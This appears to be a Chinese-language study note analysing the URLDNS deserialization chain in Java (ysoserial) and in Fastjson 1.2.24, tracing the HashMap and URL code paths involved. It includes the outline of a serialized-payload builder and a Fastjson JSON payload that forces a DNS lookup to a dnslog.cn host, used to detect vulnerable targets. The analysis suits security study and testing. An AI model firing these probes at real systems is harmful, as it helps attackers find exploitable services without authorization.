## Java反序列化中的URLDNS链
***1.先看一下ysoserial的生成urldns的payload的代码***
![](/java/urldns/java_urldns.jpg)

***2.payload生成过程:***
* 初始化一个hashmap实例: HashMap ht = new HashMap();
* 初始化URL实例 : URL u = new URL(null, url, handler); 
* 将URL的实例作为key传入hashmap中: ht.put(u, url);
* 通过暴力反射将URL实例中的hashCode设置为-1 : Reflections.setFieldValue(u, "hashCode", -1);
* 将hashmap序列化得到payload
  

***3.反序列化过程***
* objectInputStream.readObject --> hashmap.readObject
  * ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("./dnslog.obj"));
  * Object o = objectInputStream.readObject();

* 跟进hashmap的readobject方法
![](/java/urldns/urldns_java_hashmap_readohject.jpg)

* 进入hash(key),这里的key就是对应的URL的实例对象
```
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  //key对象这里对应的就是URL的实例对象
}
```
*  进入URL@hashCode()方法,发现只有hashCode为 -1 时才能进入hashCode(this)方法,说明构造payload时设置hashCode的原因
```
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```

* 跟进hashCode(this)方法,发现这里就触发了域名的解析功能
![](/java/urldns/urldns_dnslookup.jpg)

## Fastjson反序列化中的URLDNS链
***1.先看一下fastjson的payload的代码 fastjson1.2.24 以InetAddress为例***
```
String payload ="{\"rand1\":{\"@type\":\"java.net.InetAddress\",\"val\":\"abcd.oi00cm.dnslog.cn\"}}";
Object parse = JSON.parse(payload);
```

***2.分析流***
#### 截取部分
* com.alibaba.fastjson.parser.ParserConfig(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader)
![](/java/urldns/fastjson_dnslog.jpg)


* com.alibaba.fastjson.serializer.MiscCodec.deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)
![](/java/urldns/fastjson_dnslog_go.jpg)

***3.总结***

```fastjson认为dnslog的请求是无害化的,也确实是无害的,因此针对dnslog类的处理跟其他的rce模式略为不一样```

```dnslog类作为fastjson缓存白名单模式,方便加快序列化从而造成了问题```

